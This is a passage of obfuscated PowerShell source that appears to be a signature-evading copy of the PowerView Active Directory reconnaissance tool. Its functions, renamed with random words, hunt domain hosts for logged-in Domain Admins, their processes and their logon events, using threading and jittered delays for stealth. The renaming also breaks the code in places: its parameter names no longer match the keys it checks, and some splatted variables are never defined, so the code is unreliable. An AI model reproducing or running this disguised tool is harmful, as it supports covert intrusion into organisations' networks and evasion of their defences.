                                if ( (-not $xgAEQxcxgWvrHLw) -or ($xgAEQxcxgWvrHLw -contains $p9HnEIzwegumibI) -and ($p9HnEIzwegumibI -notmatch '\$$')) {
                                    $chlzobgN9SNL9hL = @(emaciates -cNTDaoDBIWkDu9I $dtDeQCTchbpHZVi)[0].IPAddress
                                    $QxoKRMvPLUQO9R9 = New-Object PSObject
                                    $QxoKRMvPLUQO9R9 | Add-Member Noteproperty 'UserDomain' $tXyHSLSY9cxTtcf
                                    $QxoKRMvPLUQO9R9 | Add-Member Noteproperty 'UserName' $p9HnEIzwegumibI
                                    $QxoKRMvPLUQO9R9 | Add-Member Noteproperty 'ComputerName' $dtDeQCTchbpHZVi
                                    $QxoKRMvPLUQO9R9 | Add-Member Noteproperty 'IPAddress' $chlzobgN9SNL9hL
                                    $QxoKRMvPLUQO9R9 | Add-Member Noteproperty 'SessionFrom' $Null
                                    $QxoKRMvPLUQO9R9 | Add-Member Noteproperty 'SessionFromName' $Null


                                    if ($C9ukZODkrjoYuwt) {
                                        $Admin = Boulez -cNTDaoDBIWkDu9I $dtDeQCTchbpHZVi
                                        $QxoKRMvPLUQO9R9 | Add-Member Noteproperty 'LocalAdmin' $Admin.IsAdmin
                                    }
                                    else {
                                        $QxoKRMvPLUQO9R9 | Add-Member Noteproperty 'LocalAdmin' $Null
                                    }
                                    $QxoKRMvPLUQO9R9.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')
                                    $QxoKRMvPLUQO9R9
                                }
                            }
                        }
                    }
                }
            }

            if ($waC9KrLWsegTDKV) {
                volubility
            }
        }

        $wFitNRlTdxnBQoR = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $wFitNRlTdxnBQoR = descendents -szvFVWkPJummdcf $szvFVWkPJummdcf
            }
            else {
                $wFitNRlTdxnBQoR = descendents -szvFVWkPJummdcf $szvFVWkPJummdcf -Quiet
            }
        }
    }

    PROCESS {

        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[Hersey] Total number of hosts: $($plcGtRUbnHLQSQg.count)"
            Write-Verbose "[Hersey] Delay: $Delay, Jitter: $ZfNRkQyXmbOtsJi"
            $gdk9IoHOntLjUfN = 0
            $KJMo9RKXqLNQvnV = New-Object System.Random

            ForEach ($dtDeQCTchbpHZVi in $plcGtRUbnHLQSQg) {
                $gdk9IoHOntLjUfN = $gdk9IoHOntLjUfN + 1


                Start-Sleep -Seconds $KJMo9RKXqLNQvnV.Next((1-$ZfNRkQyXmbOtsJi)*$Delay, (1+$ZfNRkQyXmbOtsJi)*$Delay)

                Write-Verbose "[Hersey] Enumerating server $wlkrajnezbzvml9 ($gdk9IoHOntLjUfN of $($plcGtRUbnHLQSQg.Count))"
                Invoke-Command -xxcoHOOdC9XDRbN $ErAMHSSYDKfA9ql -ArgumentList $dtDeQCTchbpHZVi, $xgAEQxcxgWvrHLw, $WPxsp9KIBMFyVPQ, $ymiQhvnIj9XpEZO, $wFitNRlTdxnBQoR

                if ($tP9ZFuQ9oFJi9ZB -and $wfOGcw9qvB9FFwB) {
                    Write-Verbose "[Hersey] Target user found, returning early"
                    return
                }
            }
        }
        else {
            Write-Verbose "[Hersey] Using threading with threads: $bCPdUwesQHczYxi"
            Write-Verbose "[Hersey] TargetComputers length: $($plcGtRUbnHLQSQg.Length)"


            $kWZJZEzyPFVetra = @{
                'TargetUsers' = $xgAEQxcxgWvrHLw
                'CurrentUser' = $WPxsp9KIBMFyVPQ
                'Stealth' = $ymiQhvnIj9XpEZO
                'TokenHandle' = $wFitNRlTdxnBQoR
            }


            overhanging -cNTDaoDBIWkDu9I $plcGtRUbnHLQSQg -xxcoHOOdC9XDRbN $ErAMHSSYDKfA9ql -Xz99HsFbkRJSMQr $kWZJZEzyPFVetra -bCPdUwesQHczYxi $bCPdUwesQHczYxi
        }
    }

    END {
        if ($wFitNRlTdxnBQoR) {
            volubility -waC9KrLWsegTDKV $wFitNRlTdxnBQoR
        }
    }
}


function divans {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $cNTDaoDBIWkDu9I,

        [ValidateNotNullOrEmpty()]
        [String]
        $pkMxgDCVHqOym9m,

        [ValidateNotNullOrEmpty()]
        [String]
        $GyzgQ99fslvJJXn,

        [ValidateNotNullOrEmpty()]
        [String]
        $oE9vUfkxgRReuty,

        [ValidateNotNullOrEmpty()]
        [String]
        $UmwYca9aFyjuaIs,

        [Alias('Unconstrained')]
        [Switch]
        $Cq99nHujfUsYEwD,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $OsAyFkcArbBEJUH,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $mQaSIPnAtdFBzca,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $BYbApcQRbSfXVl9,

        [Parameter(ParameterSetName = 'TargetProcess')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ESd9FgmtOzCXpwI,

        [Parameter(ParameterSetName = 'TargetUser')]
        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PgzXxHGVDkWW9LL,

        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $tXyHSLSY9cxTtcf,

        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $lx9RyTdzbRIfLcy,

        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $e9BTABNRQU9IgXo,

        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $XC9DmEoUS9mEzUC = 'Domain Admins',

        [Parameter(ParameterSetName = 'TargetUser')]
        [Alias('AdminCount')]
        [Switch]
        $KHMEppywT9VRNZT,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vzBgfX9wPWmbsYZ,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $HWlMnJozs9zEkRJ = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $hHyMPLAr9azKKcQ = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $kzlBjIuOb9n9uyj,

        [Switch]
        $gPSKVqwcbkEyaoZ,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $wfOGcw9qvB9FFwB,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $ZfNRkQyXmbOtsJi = .3,

        [Int]
        [ValidateRange(1, 100)]
        $bCPdUwesQHczYxi = 20
    )

    BEGIN {
        $uZfdOJKpxwOpKKH = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['Domain']) { $uZfdOJKpxwOpKKH['Domain'] = $pkMxgDCVHqOym9m }
        if ($PSBoundParameters['ComputerDomain']) { $uZfdOJKpxwOpKKH['Domain'] = $GyzgQ99fslvJJXn }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $uZfdOJKpxwOpKKH['LDAPFilter'] = $oE9vUfkxgRReuty }
        if ($PSBoundParameters['ComputerSearchBase']) { $uZfdOJKpxwOpKKH['SearchBase'] = $UmwYca9aFyjuaIs }
        if ($PSBoundParameters['Unconstrained']) { $uZfdOJKpxwOpKKH['Unconstrained'] = $Ku9ZmWgd9fLSPTw }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $uZfdOJKpxwOpKKH['OperatingSystem'] = $eloJwlA9uqrC9UD }
        if ($PSBoundParameters['ComputerServicePack']) { $uZfdOJKpxwOpKKH['ServicePack'] = $NIr9bUdzpfH9Gni }
        if ($PSBoundParameters['ComputerSiteName']) { $uZfdOJKpxwOpKKH['SiteName'] = $SmSMWEXMkNVoOuD }
        if ($PSBoundParameters['Server']) { $uZfdOJKpxwOpKKH['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['SearchScope']) { $uZfdOJKpxwOpKKH['SearchScope'] = $HWlMnJozs9zEkRJ }
        if ($PSBoundParameters['ResultPageSize']) { $uZfdOJKpxwOpKKH['ResultPageSize'] = $hHyMPLAr9azKKcQ }
        if ($PSBoundParameters['ServerTimeLimit']) { $uZfdOJKpxwOpKKH['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
        if ($PSBoundParameters['Tombstone']) { $uZfdOJKpxwOpKKH['Tombstone'] = $gPSKVqwcbkEyaoZ }
        if ($PSBoundParameters['Credential']) { $uZfdOJKpxwOpKKH['Credential'] = $szvFVWkPJummdcf }

        $X9xElWbFpfFW9IW = @{
            'Properties' = 'samaccountname'
        }
        if ($PSBoundParameters['UserIdentity']) { $X9xElWbFpfFW9IW['Identity'] = $PgzXxHGVDkWW9LL }
        if ($PSBoundParameters['Domain']) { $X9xElWbFpfFW9IW['Domain'] = $pkMxgDCVHqOym9m }
        if ($PSBoundParameters['UserDomain']) { $X9xElWbFpfFW9IW['Domain'] = $tXyHSLSY9cxTtcf }
        if ($PSBoundParameters['UserLDAPFilter']) { $X9xElWbFpfFW9IW['LDAPFilter'] = $lx9RyTdzbRIfLcy }
        if ($PSBoundParameters['UserSearchBase']) { $X9xElWbFpfFW9IW['SearchBase'] = $e9BTABNRQU9IgXo }
        if ($PSBoundParameters['UserAdminCount']) { $X9xElWbFpfFW9IW['AdminCount'] = $KHMEppywT9VRNZT }
        if ($PSBoundParameters['Server']) { $X9xElWbFpfFW9IW['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['SearchScope']) { $X9xElWbFpfFW9IW['SearchScope'] = $HWlMnJozs9zEkRJ }
        if ($PSBoundParameters['ResultPageSize']) { $X9xElWbFpfFW9IW['ResultPageSize'] = $hHyMPLAr9azKKcQ }
        if ($PSBoundParameters['ServerTimeLimit']) { $X9xElWbFpfFW9IW['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
        if ($PSBoundParameters['Tombstone']) { $X9xElWbFpfFW9IW['Tombstone'] = $gPSKVqwcbkEyaoZ }
        if ($PSBoundParameters['Credential']) { $X9xElWbFpfFW9IW['Credential'] = $szvFVWkPJummdcf }



        if ($PSBoundParameters['ComputerName']) {
            $plcGtRUbnHLQSQg = $cNTDaoDBIWkDu9I
        }
        else {
            Write-Verbose '[divans] Querying computers in the domain'
            $plcGtRUbnHLQSQg = eigenvalues @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[divans] TargetComputers length: $($plcGtRUbnHLQSQg.Length)"
        if ($plcGtRUbnHLQSQg.Length -eq 0) {
            throw '[divans] No hosts found to enumerate'
        }


        if ($PSBoundParameters['ProcessName']) {
            $GbuJeU9xA9sHlYV = @()
            ForEach ($T in $ESd9FgmtOzCXpwI) {
                $GbuJeU9xA9sHlYV += $T.Split(',')
            }
            if ($GbuJeU9xA9sHlYV -isnot [System.Array]) {
                $GbuJeU9xA9sHlYV = [String[]] @($GbuJeU9xA9sHlYV)
            }
        }
        elseif ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount'] -or $PSBoundParameters['UserAllowDelegation']) {
            $xgAEQxcxgWvrHLw = noshes @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        else {
            $yyUfJI9zuL99pOP = @{
                'Identity' = $XC9DmEoUS9mEzUC
                'Recurse' = $True
            }
            if ($PSBoundParameters['UserDomain']) { $yyUfJI9zuL99pOP['Domain'] = $tXyHSLSY9cxTtcf }
            if ($PSBoundParameters['UserSearchBase']) { $yyUfJI9zuL99pOP['SearchBase'] = $e9BTABNRQU9IgXo }
            if ($PSBoundParameters['Server']) { $yyUfJI9zuL99pOP['Server'] = $vzBgfX9wPWmbsYZ }
            if ($PSBoundParameters['SearchScope']) { $yyUfJI9zuL99pOP['SearchScope'] = $HWlMnJozs9zEkRJ }
            if ($PSBoundParameters['ResultPageSize']) { $yyUfJI9zuL99pOP['ResultPageSize'] = $hHyMPLAr9azKKcQ }
            if ($PSBoundParameters['ServerTimeLimit']) { $yyUfJI9zuL99pOP['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
            if ($PSBoundParameters['Tombstone']) { $yyUfJI9zuL99pOP['Tombstone'] = $gPSKVqwcbkEyaoZ }
            if ($PSBoundParameters['Credential']) { $yyUfJI9zuL99pOP['Credential'] = $szvFVWkPJummdcf }
            $yyUfJI9zuL99pOP
            $xgAEQxcxgWvrHLw = squiggles @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }


        $ErAMHSSYDKfA9ql = {
            Param($cNTDaoDBIWkDu9I, $ESd9FgmtOzCXpwI, $xgAEQxcxgWvrHLw, $szvFVWkPJummdcf)

            ForEach ($dtDeQCTchbpHZVi in $cNTDaoDBIWkDu9I) {
                $Up = Test-Connection -Count 1 -Quiet -cNTDaoDBIWkDu9I $dtDeQCTchbpHZVi
                if ($Up) {


                    if ($szvFVWkPJummdcf) {
                        $DRtdGaHLHc999ys = wholes -szvFVWkPJummdcf $szvFVWkPJummdcf -cNTDaoDBIWkDu9I $dtDeQCTchbpHZVi -ErrorAction SilentlyContinue
                    }
                    else {
                        $DRtdGaHLHc999ys = wholes -cNTDaoDBIWkDu9I $dtDeQCTchbpHZVi -ErrorAction SilentlyContinue
                    }
                    ForEach ($YAygLxUTxZzDbls in $DRtdGaHLHc999ys) {

                        if ($ESd9FgmtOzCXpwI) {
                            if ($ESd9FgmtOzCXpwI -Contains $YAygLxUTxZzDbls.ProcessName) {
                                $YAygLxUTxZzDbls
                            }
                        }

                        elseif ($xgAEQxcxgWvrHLw -Contains $YAygLxUTxZzDbls.User) {
                            $YAygLxUTxZzDbls
                        }
                    }
                }
            }
        }
    }

    PROCESS {

        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[divans] Total number of hosts: $($plcGtRUbnHLQSQg.count)"
            Write-Verbose "[divans] Delay: $Delay, Jitter: $ZfNRkQyXmbOtsJi"
            $gdk9IoHOntLjUfN = 0
            $KJMo9RKXqLNQvnV = New-Object System.Random

            ForEach ($dtDeQCTchbpHZVi in $plcGtRUbnHLQSQg) {
                $gdk9IoHOntLjUfN = $gdk9IoHOntLjUfN + 1


                Start-Sleep -Seconds $KJMo9RKXqLNQvnV.Next((1-$ZfNRkQyXmbOtsJi)*$Delay, (1+$ZfNRkQyXmbOtsJi)*$Delay)

                Write-Verbose "[divans] Enumerating server $dtDeQCTchbpHZVi ($gdk9IoHOntLjUfN of $($plcGtRUbnHLQSQg.count))"
                $tP9ZFuQ9oFJi9ZB = Invoke-Command -xxcoHOOdC9XDRbN $ErAMHSSYDKfA9ql -ArgumentList $dtDeQCTchbpHZVi, $GbuJeU9xA9sHlYV, $xgAEQxcxgWvrHLw, $szvFVWkPJummdcf
                $tP9ZFuQ9oFJi9ZB

                if ($tP9ZFuQ9oFJi9ZB -and $wfOGcw9qvB9FFwB) {
                    Write-Verbose "[divans] Target user found, returning early"
                    return
                }
            }
        }
        else {
            Write-Verbose "[divans] Using threading with threads: $bCPdUwesQHczYxi"


            $kWZJZEzyPFVetra = @{
                'ProcessName' = $GbuJeU9xA9sHlYV
                'TargetUsers' = $xgAEQxcxgWvrHLw
                'Credential' = $szvFVWkPJummdcf
            }


            overhanging -cNTDaoDBIWkDu9I $plcGtRUbnHLQSQg -xxcoHOOdC9XDRbN $ErAMHSSYDKfA9ql -Xz99HsFbkRJSMQr $kWZJZEzyPFVetra -bCPdUwesQHczYxi $bCPdUwesQHczYxi
        }
    }
}


function recessions {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogon')]
    [CmdletBinding(DefaultParameterSetName = 'Domain')]
    Param(
        [Parameter(ParameterSetName = 'ComputerName', Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $cNTDaoDBIWkDu9I,

        [Parameter(ParameterSetName = 'Domain')]
        [ValidateNotNullOrEmpty()]
        [String]
        $pkMxgDCVHqOym9m,

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $9QyouHvxMZKCIKN,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $9cjkbHBwllnekPC = [DateTime]::Now.AddDays(-1),

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $IIO9lspSsnKG9SG = [DateTime]::Now,

        [ValidateRange(1, 1000000)]
        [Int]
        $FWkLQHcyB9DTAFr = 5000,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $PgzXxHGVDkWW9LL,

        [ValidateNotNullOrEmpty()]
        [String]
        $tXyHSLSY9cxTtcf,

        [ValidateNotNullOrEmpty()]
        [String]
        $lx9RyTdzbRIfLcy,

        [ValidateNotNullOrEmpty()]
        [String]
        $e9BTABNRQU9IgXo,

        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $XC9DmEoUS9mEzUC = 'Domain Admins',

        [Alias('AdminCount')]
        [Switch]
        $KHMEppywT9VRNZT,

        [Switch]
        $C9ukZODkrjoYuwt,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vzBgfX9wPWmbsYZ,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $HWlMnJozs9zEkRJ = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $hHyMPLAr9azKKcQ = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $kzlBjIuOb9n9uyj,

        [Switch]
        $gPSKVqwcbkEyaoZ,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $wfOGcw9qvB9FFwB,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $ZfNRkQyXmbOtsJi = .3,

        [Int]
        [ValidateRange(1, 100)]
        $bCPdUwesQHczYxi = 20
    )

    BEGIN {
        $X9xElWbFpfFW9IW = @{
            'Properties' = 'samaccountname'
        }
        if ($PSBoundParameters['UserIdentity']) { $X9xElWbFpfFW9IW['Identity'] = $PgzXxHGVDkWW9LL }
        if ($PSBoundParameters['UserDomain']) { $X9xElWbFpfFW9IW['Domain'] = $tXyHSLSY9cxTtcf }
        if ($PSBoundParameters['UserLDAPFilter']) { $X9xElWbFpfFW9IW['LDAPFilter'] = $lx9RyTdzbRIfLcy }
        if ($PSBoundParameters['UserSearchBase']) { $X9xElWbFpfFW9IW['SearchBase'] = $e9BTABNRQU9IgXo }
        if ($PSBoundParameters['UserAdminCount']) { $X9xElWbFpfFW9IW['AdminCount'] = $KHMEppywT9VRNZT }
        if ($PSBoundParameters['Server']) { $X9xElWbFpfFW9IW['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['SearchScope']) { $X9xElWbFpfFW9IW['SearchScope'] = $HWlMnJozs9zEkRJ }
        if ($PSBoundParameters['ResultPageSize']) { $X9xElWbFpfFW9IW['ResultPageSize'] = $hHyMPLAr9azKKcQ }
        if ($PSBoundParameters['ServerTimeLimit']) { $X9xElWbFpfFW9IW['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
        if ($PSBoundParameters['Tombstone']) { $X9xElWbFpfFW9IW['Tombstone'] = $gPSKVqwcbkEyaoZ }
        if ($PSBoundParameters['Credential']) { $X9xElWbFpfFW9IW['Credential'] = $szvFVWkPJummdcf }

        if ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount']) {
            $xgAEQxcxgWvrHLw = noshes @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        elseif ($PSBoundParameters['UserGroupIdentity'] -or (-not $PSBoundParameters['Filter'])) {

            $yyUfJI9zuL99pOP = @{
                'Identity' = $XC9DmEoUS9mEzUC
                'Recurse' = $True
            }
            Write-Verbose "UserGroupIdentity: $XC9DmEoUS9mEzUC"
            if ($PSBoundParameters['UserDomain']) { $yyUfJI9zuL99pOP['Domain'] = $tXyHSLSY9cxTtcf }
            if ($PSBoundParameters['UserSearchBase']) { $yyUfJI9zuL99pOP['SearchBase'] = $e9BTABNRQU9IgXo }
            if ($PSBoundParameters['Server']) { $yyUfJI9zuL99pOP['Server'] = $vzBgfX9wPWmbsYZ }
            if ($PSBoundParameters['SearchScope']) { $yyUfJI9zuL99pOP['SearchScope'] = $HWlMnJozs9zEkRJ }
            if ($PSBoundParameters['ResultPageSize']) { $yyUfJI9zuL99pOP['ResultPageSize'] = $hHyMPLAr9azKKcQ }
            if ($PSBoundParameters['ServerTimeLimit']) { $yyUfJI9zuL99pOP['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
            if ($PSBoundParameters['Tombstone']) { $yyUfJI9zuL99pOP['Tombstone'] = $gPSKVqwcbkEyaoZ }
            if ($PSBoundParameters['Credential']) { $yyUfJI9zuL99pOP['Credential'] = $szvFVWkPJummdcf }
            $xgAEQxcxgWvrHLw = squiggles @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }


        if ($PSBoundParameters['ComputerName']) {
            $plcGtRUbnHLQSQg = $cNTDaoDBIWkDu9I
        }
        else {

            $skPRj9IXdZiEdSj = @{
                'LDAP' = $True
            }
            if ($PSBoundParameters['Domain']) { $skPRj9IXdZiEdSj['Domain'] = $pkMxgDCVHqOym9m }
            if ($PSBoundParameters['Server']) { $skPRj9IXdZiEdSj['Server'] = $vzBgfX9wPWmbsYZ }
            if ($PSBoundParameters['Credential']) { $skPRj9IXdZiEdSj['Credential'] = $szvFVWkPJummdcf }
            Write-Verbose "[recessions] Querying for domain controllers in domain: $pkMxgDCVHqOym9m"
            $plcGtRUbnHLQSQg = milligram @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        if ($plcGtRUbnHLQSQg -and ($plcGtRUbnHLQSQg -isnot [System.Array])) {
            $plcGtRUbnHLQSQg = @(,$plcGtRUbnHLQSQg)
        }
        Write-Verbose "[recessions] TargetComputers length: $($plcGtRUbnHLQSQg.Length)"
        Write-Verbose "[recessions] TargetComputers $plcGtRUbnHLQSQg"
        if ($plcGtRUbnHLQSQg.Length -eq 0) {
            throw '[recessions] No hosts found to enumerate'
        }


        $ErAMHSSYDKfA9ql = {
            Param($cNTDaoDBIWkDu9I, $9cjkbHBwllnekPC, $IIO9lspSsnKG9SG, $FWkLQHcyB9DTAFr, $xgAEQxcxgWvrHLw, $9QyouHvxMZKCIKN, $szvFVWkPJummdcf)

            ForEach ($dtDeQCTchbpHZVi in $cNTDaoDBIWkDu9I) {
                $Up = Test-Connection -Count 1 -Quiet -cNTDaoDBIWkDu9I $dtDeQCTchbpHZVi
                if ($Up) {
                    $rpIWC9gfP9sAeuW = @{
                        'ComputerName' = $dtDeQCTchbpHZVi
                    }
                    if ($9cjkbHBwllnekPC) { $rpIWC9gfP9sAeuW['StartTime'] = $9cjkbHBwllnekPC }
                    if ($IIO9lspSsnKG9SG) { $rpIWC9gfP9sAeuW['EndTime'] = $IIO9lspSsnKG9SG }
                    if ($FWkLQHcyB9DTAFr) { $rpIWC9gfP9sAeuW['MaxEvents'] = $FWkLQHcyB9DTAFr }
                    if ($szvFVWkPJummdcf) { $rpIWC9gfP9sAeuW['Credential'] = $szvFVWkPJummdcf }
                    if ($9QyouHvxMZKCIKN -or $xgAEQxcxgWvrHLw) {
                        if ($xgAEQxcxgWvrHLw) {
                            municipalities @DomainUserEventArgs | Where-Object {$xgAEQxcxgWvrHLw -contains $_.TargetUserName}
                        }
                        else {
                            $fp9POXSHkifaTEG = 'or'
                            $9QyouHvxMZKCIKN.Keys | ForEach-Object {
                                if (($_ -eq 'Op') -or ($_ -eq 'Operator') -or ($_ -eq 'Operation')) {
                                    if (($9QyouHvxMZKCIKN[$_] -match '&') -or ($9QyouHvxMZKCIKN[$_] -eq 'and')) {
                                        $fp9POXSHkifaTEG = 'and'
                                    }
                                }
                            }
                            $Keys = $9QyouHvxMZKCIKN.Keys | Where-Object {($_ -ne 'Op') -and ($_ -ne 'Operator') -and ($_ -ne 'Operation')}
                            municipalities @DomainUserEventArgs | ForEach-Object {
                                if ($fp9POXSHkifaTEG -eq 'or') {
                                    ForEach ($Key in $Keys) {
                                        if ($_."$Key" -match $9QyouHvxMZKCIKN[$Key]) {
                                            $_
                                        }
                                    }
                                }
                                else {

                                    ForEach ($Key in $Keys) {
                                        if ($_."$Key" -notmatch $9QyouHvxMZKCIKN[$Key]) {
                                            break
                                        }
                                        $_
                                    }
                                }
                            }
                        }
                    }
                    else {
                        municipalities @DomainUserEventArgs
                    }
                }
            }
        }
    }

    PROCESS {

        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[recessions] Total number of hosts: $($plcGtRUbnHLQSQg.count)"
            Write-Verbose "[recessions] Delay: $Delay, Jitter: $ZfNRkQyXmbOtsJi"
            $gdk9IoHOntLjUfN = 0
            $KJMo9RKXqLNQvnV = New-Object System.Random

            ForEach ($dtDeQCTchbpHZVi in $plcGtRUbnHLQSQg) {
                $gdk9IoHOntLjUfN = $gdk9IoHOntLjUfN + 1


                Start-Sleep -Seconds $KJMo9RKXqLNQvnV.Next((1-$ZfNRkQyXmbOtsJi)*$Delay, (1+$ZfNRkQyXmbOtsJi)*$Delay)

                Write-Verbose "[recessions] Enumerating server $dtDeQCTchbpHZVi ($gdk9IoHOntLjUfN of $($plcGtRUbnHLQSQg.count))"
                $tP9ZFuQ9oFJi9ZB = Invoke-Command -xxcoHOOdC9XDRbN $ErAMHSSYDKfA9ql -ArgumentList $dtDeQCTchbpHZVi, $9cjkbHBwllnekPC, $IIO9lspSsnKG9SG, $FWkLQHcyB9DTAFr, $xgAEQxcxgWvrHLw, $9QyouHvxMZKCIKN, $szvFVWkPJummdcf
                $tP9ZFuQ9oFJi9ZB

                if ($tP9ZFuQ9oFJi9ZB -and $wfOGcw9qvB9FFwB) {
                    Write-Verbose "[recessions] Target user found, returning early"
                    return
                }
            }
        }
        else {
            Write-Verbose "[recessions] Using threading with threads: $bCPdUwesQHczYxi"


            $kWZJZEzyPFVetra = @{
                'StartTime' = $9cjkbHBwllnekPC
                'EndTime' = $IIO9lspSsnKG9SG
                'MaxEvents' = $FWkLQHcyB9DTAFr
                'TargetUsers' = $xgAEQxcxgWvrHLw
                'Filter' = $9QyouHvxMZKCIKN
                'Credential' = $szvFVWkPJummdcf
            }


            overhanging -cNTDaoDBIWkDu9I $plcGtRUbnHLQSQg -xxcoHOOdC9XDRbN $ErAMHSSYDKfA9ql -Xz99HsFbkRJSMQr $kWZJZEzyPFVetra -bCPdUwesQHczYxi $bCPdUwesQHczYxi
        }
    }
}


function symmetrical {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ShareInfo')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $cNTDaoDBIWkDu9I,

        [ValidateNotNullOrEmpty()]
        [Alias('Domain')]
        [String]
        $GyzgQ99fslvJJXn,

        [ValidateNotNullOrEmpty()]
        [String]
        $oE9vUfkxgRReuty,

        [ValidateNotNullOrEmpty()]
        [String]
        $UmwYca9aFyjuaIs,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $OsAyFkcArbBEJUH,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $mQaSIPnAtdFBzca,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $BYbApcQRbSfXVl9,

        [Alias('CheckAccess')]
        [Switch]
        $nxwuJVGdfkClEL9,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vzBgfX9wPWmbsYZ,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $HWlMnJozs9zEkRJ = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $hHyMPLAr9azKKcQ = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $kzlBjIuOb9n9uyj,

        [Switch]
        $gPSKVqwcbkEyaoZ,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
